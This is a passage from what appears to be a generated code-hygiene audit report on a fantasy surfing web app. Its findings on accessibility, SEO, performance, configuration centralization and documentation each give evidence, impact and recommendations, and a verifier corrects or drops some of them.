- **Evidence:** css/fantasy.css:324-327 `.btn--primary { background: var(--color-sage); color:#fff }` — #fff on --color-sage (#9CA898) computes to a 2.48:1 ratio (needs 4.5:1 text / 3:1 for UI). This is the app-wide CTA ("Sign In with Google", "Save Profile", "Apply"). css/fantasy.css:930 `.text-muted { color: var(--color-warm-brown) }` (#8B7E74) is 3.1–3.9:1 on the cream/beige backgrounds and is used 90+ times across every page (team 7, admin 26, event 17, data 11, profile 11, index 7). `.text-sage` (#9CA898) text is 2.0–2.4:1, and `--color-warm-gray` (#C9C5BE) used as text in `.footer-sub` (css:768-770) and the auth-gate is 1.4–1.7:1.
- **Impact:** Low-vision users (and anyone in bright sunlight on a phone — likely for a surf audience) cannot reliably read the primary action buttons or the secondary/metadata text that carries prices, dates, and helper copy. This is the single highest-reach a11y issue because it touches every page.
- **Recommendation:** Darken the interactive/text tokens: make `.btn--primary` use `--color-sage-dark` (#7D8975, still only 3.68:1 — better, push to ~#677260 for AA), retarget `.text-muted` to a token at ≥4.5:1 on cream (e.g. ~#6B6157), and stop using `--color-warm-gray`/`--color-sage` as standalone text colors. These are token edits in one file, so the change propagates everywhere.

#### F-69 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**Keyboard focus is invisible — outline:none with no :focus-visible replacement**

- **Category:** Accessibility / keyboard navigation
- **Evidence:** css/fantasy.css:628-629, 646-647, 680-683 all set `outline: none` on `:focus` for `.search-input`, `.filter-select`, `.form-input/-select/-textarea`, and `.inline-select:focus` (1647). `grep -rn focus-visible` across css/*.css, *.html, js/*.js returns zero matches. `.btn` (css:303-315) defines no focus style at all, relying on inconsistent browser defaults that are nearly invisible against the sage fill.
- **Impact:** A keyboard-only or switch-device user tabbing through sign-in, profile edit, search, admin forms, and the auth gate cannot see where focus is — they're navigating blind. WCAG 2.4.7 (Focus Visible) failure across every interactive control.
- **Recommendation:** Add a global `:focus-visible { outline: 2px solid var(--color-sage-dark); outline-offset: 2px }` rule (and a matching one on `.btn`), keeping `:focus:not(:focus-visible)` clean so mouse clicks don't show a ring. One small CSS block fixes all controls.

#### F-70 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Modals don't trap Tab focus or lock background scroll**

- **Category:** Accessibility / focus management
- **Evidence:** js/ui.js:502-572 `confirmModal()` and 580-695 `openProfileEditModal()` correctly handle Esc (557, 628) and restore `previouslyFocused` (547-553), and `confirmModal` focuses the confirm button (570). But neither handles `e.key === 'Tab'` (grep for Tab handling in js/*.js returns nothing), so Tab walks out of the dialog into the page behind the `aria-modal="true"` overlay. No `body { overflow:hidden }` / scroll lock is applied on open (grep for body.style/overflow:hidden in ui.js: none).
- **Impact:** A screen-reader/keyboard user can tab to controls hidden behind the overlay while a modal claims `aria-modal`, which is both confusing and a WCAG 2.4.3 focus-order problem. The missing scroll lock also lets the page scroll under the dialog on mobile.
- **Recommendation:** Add a small shared focus-trap helper: on `keydown` Tab, wrap focus between the first/last focusable elements inside `.modal`; toggle `document.body.style.overflow='hidden'` on open and restore on close. Both modals already share the open/close scaffolding, so one helper covers both.

#### F-71 · 🟡 MEDIUM · effort: trivial · ✅ verified (high conf.)

**Toasts have no ARIA live region — status/error messages are silent to screen readers**

- **Category:** Accessibility / ARIA
- **Evidence:** js/ui.js:454-460 `ensureToastContainer()` creates `<div class="toast-container">` with no `role`/`aria-live`; `toast()` (470-493) injects text into it. grep for `aria-live|role="status"|role="alert"` in js/ui.js and *.html returns nothing. Toasts carry meaningful feedback like "Team name is required." (ui.js:666), "Upload failed", "Profile saved!", and save errors throughout team/admin.
- **Impact:** Blind users get no announcement of validation errors or success confirmations — they may resubmit, assume failure, or not know a save succeeded. WCAG 4.1.3 (Status Messages) failure.
- **Recommendation:** Add `role="status" aria-live="polite" aria-atomic="true"` to the toast container (use `aria-live="assertive"` for `type==="error"` if you want errors to interrupt). One-line change in `ensureToastContainer()`.

#### F-72 · 🟡 MEDIUM · effort: trivial · ✅ verified (high conf.)

**Search inputs rely on placeholder only — no associated label**

- **Category:** Accessibility / form labels
- **Evidence:** standings.html:176 `<input type="search" id="player-search" placeholder="Search players...">` and data.html:481 `<input ... id="surfer-search" placeholder="Search surfers…">` have no `<label for>` and no `aria-label`. The auth-gate inputs (ui.js:755-757) are also placeholder-only ("Email address", "Password", "Your name"). admin.html has 22 `<label>` for 19 inputs (decent), but the public search fields don't.
- **Impact:** Placeholder text is not a programmatic label — it vanishes on input and many screen readers don't announce it, so these fields are announced as just "edit text." WCAG 1.3.1/4.1.2 and 3.3.2 (Labels or Instructions).
- **Recommendation:** Add `aria-label="Search players"` / `aria-label="Search surfers"` (and aria-labels on the auth-gate email/password/name inputs). Trivial attribute additions; no visual change.

#### F-73 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Click-to-add surfer path is mouse-only; drop buttons are 18px tap targets**

- **Category:** UX / keyboard & touch targets
- **Evidence:** team.html:665-668 the available-card is a `<div class="surfer-row available-card">` with `data-card-add`/`draggable` but no `role="button"`, `tabindex`, or `keydown` handler — its click handler (wired at ~743) can't be triggered by keyboard. So although a non-drag fallback exists, it's reachable only by mouse/touch. Separately, `.team-row__drop-btn` (css/fantasy.css:1448-1453) is `width:18px; height:18px` at the tile corner — far below the WCAG 2.5.8 24px minimum (and 2.5.5 44px), on a touch-first roster editor.
- **Impact:** Keyboard-only users cannot build or edit a roster at all (the core action of the app). On mobile, the 18px drop/remove buttons crowded at tile corners are easy to miss and easy to fat-finger.
- **Recommendation:** Make the available-card a real `<button>` (or add `role="button" tabindex="0"` + Enter/Space handler) so the existing click-to-add works from the keyboard; bump the drop button to ≥24px (44px ideal) with an expanded hit area via padding or a transparent `::before`.

#### F-74 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**Open Graph / Twitter / meta description exist only on index.html**

- **Category:** SEO / social metadata
- **Evidence:** Per-page `<head>` extraction shows index.html has full og:/twitter:/description tags (index.html:6-17) but team, standings, event, surfers, club, data, profile, admin, and about have only charset/viewport/title/icon. No page has a `<link rel="canonical">` or robots meta (grep returns none). The CNAME confirms the custom domain is fantasysurfer.org, so the absolute og:image/og:url on index.html are correct (not a bug).
- **Impact:** Any non-home page shared to social (e.g. a standings or about link) renders with no rich preview, and search engines get no description. Lower stakes for an auth-gated app, but about.html is public-facing marketing copy that would benefit.
- **Recommendation:** Promote the OG/Twitter/description block (with a sensible per-page title/description) at least to about.html and index.html — they're the discoverable public pages. The rest are auth-gated and lower priority. Optional: add a `<link rel="canonical">`.

#### F-75 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**3.7MB loadpage.jpg is the auth-gate background and the social share image**

- **Category:** UX / performance
- **Evidence:** img/loadpage.jpg is 3,730,028 bytes (`ls -la img/`). js/ui.js:720 sets it as the full-cover `background:url('img/loadpage.jpg')` for the auth gate (every logged-out page load), and index.html:11/17 use it as the og:image and twitter:image.
- **Impact:** Every logged-out visitor downloads ~3.7MB before they can read the sign-in card — slow and data-costly on mobile/cellular, the exact audience a surf app targets. Social platforms may also reject or slow-load an OG image this large.
- **Recommendation:** Compress/resize to a ~150–300KB optimized JPG (or serve a WebP with JPG fallback), and use a separate smaller dedicated OG image (~1200×630). No code changes beyond the asset swap.

#### F-76 · 🔵 LOW · effort: medium · ✅ verified (high conf.)

**ARIA widget roles declared without the expected keyboard behavior (menu, tabs, hamburger)**

- **Category:** Accessibility / ARIA correctness
- **Evidence:** js/ui.js:287-289 the user dropdown declares `role="menu"`/`role="menuitem"` but has no arrow-key navigation or Esc-to-close (only outside-click at 300-305) — grep for ArrowDown/ArrowUp/Escape-on-dropdown in ui.js returns nothing. The hamburger `.nav-toggle` (ui.js:229) has `aria-label` but never toggles `aria-expanded` (unlike the user button at 282/298 which does it correctly). admin.html:91-96 tab buttons use `.tab-btn` with no `role="tab"`/`role="tablist"`/`aria-selected`/`aria-controls`.
- **Impact:** Declaring `role=menu` makes a screen reader announce a menu-widget contract (arrow-key navigation) the code doesn't honor, which can be more confusing than no role. The hamburger doesn't report open/closed state. These are graceful-degradation cases (all items are real focusable `<button>`/`<a>`), so functionally usable but not idiomatic.
- **Recommendation:** Either implement the roving-tabindex/arrow-key + Esc behavior the roles imply, or drop to plainer markup (the dropdown works fine as a list of buttons without `role=menu`). Add `aria-expanded` toggling to `.nav-toggle` (mirror the existing user-button pattern). Admin tabs are admin-only — lowest priority.

#### F-77 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**No prefers-reduced-motion support and no <th scope> on data tables**

- **Category:** Accessibility / polish
- **Evidence:** grep for `prefers-reduced-motion` across css/*.html returns nothing, yet there's an infinite `@keyframes spin` spinner (css:826-838) and global `transition: all var(--transition)` on buttons (css:315). Separately, all 75 `<th>` elements across club/data/event/admin/standings/surfers carry no `scope` attribute (grep `<th[^>]*scope=` = 0 matches), including the multi-column per-event stat tables in data.html and surfers.html.
- **Impact:** Reduced-motion users (vestibular sensitivity) get unrequested spin/transition animation. Missing `scope` makes header-to-cell association ambiguous for screen readers in the wide stat grids, though browsers often infer it for simple tables.
- **Recommendation:** Add a `@media (prefers-reduced-motion: reduce)` block that neutralizes the spinner animation and transitions. Add `scope="col"`/`scope="row"` to the data.html and surfers.html stat-table headers (the simple tables matter less). Both are low-effort and low-risk.


### Conventions

#### F-78 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**No single source of truth for SEASON — rollover requires editing ~17 sites across 12 files**

- **Category:** config-centralization / extensibility
- **Evidence:** const SEASON = 2026 is independently re-declared in 8 HTML controllers: profile.html:30, index.html:40, team.html:256, admin.html:44, surfers.html:119, standings.html:30, event.html:30, club.html:31. Separately, db.js bakes it as a DEFAULT param in 5 exports (getEvents season=2026 :46, getCurrentEventForTour :99, carryForwardTeams :197, getLeaderboard :290, getPreviousTeam :418) and wsl-scrape.js in 3 (fetchSchedule :45, fetchSeasonRankings :124, fetchLiveEventStatus :419). It is never `export`ed from any module (grep for 'export.*SEASON' is empty). ui.js:189 uses a DIFFERENT definition entirely: `const SEASON = new Date().getFullYear()`, so the banner layer silently disagrees with the pages once the calendar year != the configured season.
- **Impact:** The season-rollover initiative (project_season_rollover.md) becomes a 17-edit shotgun change with a latent trap: the `=2026` defaults mean a page that forgets to pass SEASON silently reads last year's data instead of erroring. ui.js drifting to getFullYear() means on Jan 1 the live/countdown banners query a different season than every page renders. This is the single highest-leverage maintainability fix.
- **Recommendation:** Create js/config.js exporting `export const SEASON = 2026;` (plus other app-wide constants below). Import it in every page controller and in db.js/ui.js/wsl-scrape.js; remove the per-page redeclarations and the `=2026` default-param fallbacks (callers already pass SEASON everywhere — verified at index.html:60-64, admin.html:66, profile.html:61-62, etc. — so defaults are dead redundancy). Change ui.js:189 to import SEASON instead of getFullYear().

#### F-79 · 🟡 MEDIUM · effort: large · ✅ verified (high conf.)

**Two-tour assumption hardcoded as 183 string literals with no TOURS list**

- **Category:** extensibility / naming
- **Evidence:** Tour identity is the bare string "mens"/"womens" repeated 183 times (113 + 70 across HTML/JS). There is no `TOURS = ["mens","womens"]` constant anywhere (grep for TOURS/tours= finds only local destructuring). The two-tour shape is also structurally baked in via `const [mensX, womensX] = await Promise.all([...])` pairs in index.html:59/70/88/99, profile.html:91/145, standings.html:46, surfers.html:206, club.html:166/239. The default fallback `(e.tour || "mens")` is repeated in db.js:101/207/213/426, ui.js:77, wsl-resolve.js:36, scoring.js, team.js.
- **Impact:** Adding a foreseeable third tour (e.g. longboard, challenger series, or a Finals format) means hand-editing well over a hundred literal sites and unwinding hardcoded mens/womens destructuring on 9 pages. The bare-string convention also gives no typo protection ("womans"/"woman" would silently mismatch). The current 2-tour code is fine and readable as-is, but it is not structured to grow.
- **Recommendation:** If a third tour is genuinely on the roadmap, introduce `TOURS` + per-tour config objects in config.js and iterate `for (const tour of TOURS)` where the [mensX, womensX] pairs are. If a third tour is NOT foreseen, leave the literals but still add a single TOURS constant + the per-tour PRICING/TEAM_RULES objects already keyed by tour — that alone removes typo risk and documents the closed set cheaply.

#### F-80 · 🟡 MEDIUM · effort: medium · ⚠️ partial (high conf.)

**Design tokens exist but ~25 hardcoded hex values bypass them; no success/warning semantic token**

- **Category:** theming / CSS conventions
- **Evidence:** fantasy.css defines --color-error:#c0392b at line 27, yet the literal #c0392b is hardcoded 12x (lines 358,362,364,414,515,807,1146,1456,1457,1475,1696, +rgba(192,57,43) at 1425 — same color, two notations). Other literals duplicate existing tokens exactly: #fefdfb=--color-warm-white, #f8f7f4=--color-off-white, #f7f5f2=--color-cream, #e8e4df=--color-beige, #c9c5be=--color-warm-gray, #c97a60=--color-terracotta, #9ca898=--color-sage, #f0ebe4=--athlete-tile-fill. There is NO success/positive/warning token: 'green up' is expressed as three different literals — #217a3c+#dff5e3 (lines 401-410,803,1661-1713) and rgba(46,125,50,.85) (line 1424). Amber 'warning' #b45309 lives only as JS string literals (ui.js:759, ui.js:812, auth.js:44).
- **Impact:** A rebrand, dark mode, or accessibility palette change can't be done from :root — you must hunt ~25 CSS literals plus 4 JS literals plus 281 inline style= attributes. Mobile-friendly/pixel-consistency is a stated first-class goal (feedback_pixel_consistency.md); semantic colors drifting into 3 notations is the exact 'one concept, many homes' the project tries to avoid.
- **Recommendation:** Add --color-success / --color-success-bg / --color-warning tokens to :root; replace the literal greens/reds/ambers with var(). Sweep the ~10 hex literals that exactly equal an existing token to use the token. Leave genuinely one-off decorative hexes alone — this is about the semantic palette (error/success/warning), not every shade.
- **⚠️ Verifier correction:** The medium-severity core holds: --color-error exists but is bypassed by 11 #c0392b literals + 2 rgba(192,57,43) in CSS (and 8 more hardcoded uses across admin.html/team.html), and there is no --color-success/--color-warning token (greens scattered across #217a3c, #dff5e3, rgba(46,125,50), and even #1a7f37 in admin.html; amber #b45309 only as JS strings in ui.js:759/812 and auth.js:44). The right fix is to add --color-error usages via var() (the token already exists — club.html:361 already does this) plus new --color-success/--color-success-bg/--color-warning tokens. The claim's separate 'sweep ~10 hex literals that equal a token' recommendation is mostly unfounded: those 8 token-duplicate hexes occur only as their own :root definitions, not as bypassing duplicate usages, so there is essentially nothing to sweep there. Severity medium is fair for the error/success/warning semantic-token gap; the 'duplicate token literals' angle should be dropped.

#### F-81 · 🟡 MEDIUM · effort: trivial · ✅ verified (high conf.)

**data.html is an orphan page duplicating surfers.html's data-loading logic**

- **Category:** dead code / DRY
- **Evidence:** NAV_ITEMS in ui.js:5-10 links 'Data Vault' to surfers.html, not data.html. data.html is referenced nowhere except its own error text (data.html:146). Both data.html (lines 207-220) and surfers.html (lines 207-...) contain the SAME hardcoded list of 8 tryFetch('./data/wsl_results/wsl_{2022..2025}_{mens,womens}.json') calls and parallel buildIndices logic. RELEASE_NOTES.md documents the surfers.html 'Data Vault' rebuild, implying data.html is the superseded predecessor left in the repo.
- **Impact:** A 25KB dead page ships to GitHub Pages, is publicly reachable by URL, and any fix to the data-vault rendering must be remembered in two places (or silently diverges). New contributors can't tell which is canonical.
- **Recommendation:** Delete data.html (confirm via git history it's the old version). If it must stay as a deep-link, replace its body with a redirect to surfers.html so the duplicated fetch/index logic has one home.

#### F-82 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Historical-results year window is hardcoded and won't roll with the season**

- **Category:** config / data pipeline
- **Evidence:** The 'current season + 3 prior years' window is literal filenames in surfers.html (and data.html): wsl_2022/2023/2024/2025 _mens/_womens.json (data.html:209-218). RELEASE_NOTES says the window is 'current season + 3 prior years', but it's expressed as 8 explicit string paths, not derived from SEASON. The Python generators data/parse_rankings_2024.py / parse_rankings_2025.py that produced these JSONs are not referenced by the app and carry no README explaining how to regenerate for a new year.
- **Impact:** At the 2026→2027 rollover the Data Vault keeps showing 2022-2025 and silently omits 2026 unless someone remembers to (a) run an undocumented Python script to produce wsl_2026_*.json and (b) hand-edit two fetch lists. The data/ Python tooling's relationship to the JS app is tribal knowledge.
- **Recommendation:** Derive the file list from SEASON: `for (let y = SEASON-1; y >= SEASON-4; y--) tryFetch(\`./data/wsl_results/wsl_${y}_${tour}.json\`)`. Add a short data/README.md documenting that parse_rankings_*.py generate the wsl_results JSONs and how to run them for a new season (this is the season-rollover checklist's data step).

#### F-83 · 🔵 LOW · effort: medium · ❌ refuted (high conf.)

> **DROPPED — verification refuted.** ~~Responsive breakpoints are an unmanaged scatter (~19 distinct max-width values)~~

- **Category:** CSS conventions / mobile maintainability
- **Evidence:** Across fantasy.css and inline HTML there are ~19 distinct breakpoints with near-duplicates and no scale: 768 (x5), 800, 780, 1000 (x2), 984, 920, 900, 700, 640, 600 (x2), 540, 520, 500, 420, 280, 160, 100, 60. fantasy.css uses 1024/768/1000/600; team.html inline uses 900/600/420 (team.html:50-52); surfers.html inline uses 700. RELEASE_NOTES claims 'Consolidated breakpoints' but the inventory shows ~10 one-off values.
- **Impact:** Mobile-friendliness is a first-class objective (feedback_mobile_friendly.md). With ~10 ad-hoc breakpoints, a layout tweak at one width can leave adjacent components reflowing at a slightly different threshold, producing the inconsistent mobile seams the project explicitly wants to avoid. The near-pairs (768/780/800, 900/920/984/1000) are almost certainly meant to be the same tier.
- **Recommendation:** Pick 2-3 canonical breakpoints (e.g. --bp-tablet:768px, --bp-mobile:600px), document them in a CSS comment near :root, and snap the near-duplicate one-offs to them. Don't chase every value — collapse the obvious near-pairs (780/800→768, 920/984/1000→1024 or 920) which is most of the noise.
- **⚠️ Verifier correction:** Responsive breakpoints total 13 @media declarations across 7 distinct max-width values (no min-width queries): 768px(x5), 1000px(x2), 600px(x2), 1024px(x1), 900px(x1), 700px(x1), 420px(x1). 768px is already the de-facto canonical value. The remaining one-offs (1000, 900, 700, 420) are real near-duplicate noise and RELEASE_NOTES.md:70's 'collapsed toward 1024/768/480' is only partially done — a legitimate but low/info-severity cleanup affecting ~4 values. The asserted ~19 values are an artifact of counting non-media `max-width:` CSS properties (e.g. css/fantasy.css:1216 max-width:60px, :1611 160px, :718 500px, about.html:121 800px, and the --max-width:984px content cap) as breakpoints, which they are not.

#### F-84 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**best-9 season rule is a bare magic number slice(0, 9)**

- **Category:** naming / magic constants
- **Evidence:** scoring.js:240 `const bestNine = scores.slice(0, 9)` and the tiebreak at :250-251 use the literal 9, with the rule only named in a comment (:232 'best-9-of-N rule') and in user copy (about.html:124 'best nine event scores'). The '9' is a core business rule (CLAUDE.md Key Business Rules) but isn't a named export like ALT_CAP or TEAM_RULES are.
- **Impact:** Minor today, but the count lives in scoring code, a comment, and user-facing text independently; if the league changes to best-8 or best-10 the literal and the about.html copy can drift out of sync. Inconsistent with the otherwise-good convention of naming business constants (ALT_CAP, salaryCap, rosterSize are all named).
- **Recommendation:** Add `export const BEST_N_EVENTS = 9;` in scoring.js (or config.js) and use it in slice/tiebreak; optionally interpolate it into about.html copy. Low priority — fold into the config.js consolidation rather than as a standalone change.

#### F-85 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Top-level docs are thin/stale relative to the strong CLAUDE.md and pricing doc**

- **Category:** documentation currency
- **Evidence:** README.md is 44 bytes: 'This page is for the fantasy surfing things'. RELEASE_NOTES.md:3-4 still reads `Branch: major-ux-design-overhaul` / `Status: Pending merge to main`, but git log shows that work is on main (current HEAD b86a5e9) and the branch still exists unmerged-looking in `git branch`. CLAUDE.md is excellent and current but documents the architecture pattern, not the page inventory, so it never reveals the orphan data.html or which constants need editing at rollover.
- **Impact:** README is the GitHub landing page and the first thing a new contributor (or future-you) sees; it conveys nothing. The stale RELEASE_NOTES status line misleads about merge state. Neither is load-bearing for runtime, hence low — but cheap to fix and the rest of the docs set a high bar this undercuts.
- **Recommendation:** Expand README to a few lines: what the app is, 'no build — see CLAUDE.md', the `python3 -m http.server` run command, and a link to docs/pricing-model.md. Update RELEASE_NOTES status to 'Merged' (or move it under docs/ as a dated changelog). Add a brief 'Season rollover checklist' section to CLAUDE.md once config.js centralizes SEASON.

#### F-86 · ⚪ INFO · effort: trivial · ✅ verified (high conf.)

**.gitignore is minimal but adequate for this no-build static stack**

- **Category:** config adequacy
- **Evidence:** .gitignore contains only .DS_Store / **/.DS_Store. There is no node_modules (CDN imports, no npm — confirmed by CLAUDE.md and absence of package.json), no build dir, no env files committed (Firebase config is intentionally client-side public). data/photos and wsl_results JSON are intentionally tracked (the app fetches them at runtime).
- **Impact:** None negative — for a no-build GitHub Pages site with no secrets and no toolchain, .DS_Store is genuinely the only thing to ignore. Noting explicitly per the audit scope so it's not flagged as a gap: this is correct as-is.
- **Recommendation:** Leave as-is. The only optional add would be editor/OS cruft (*.swp, Thumbs.db) if other contributors join, but that's speculative — no change needed now.

---

_Generated from a multi-agent audit run (10 dimensions → adversarial verification → synthesis). To refresh, re-run the hygiene-audit workflow and regenerate this file._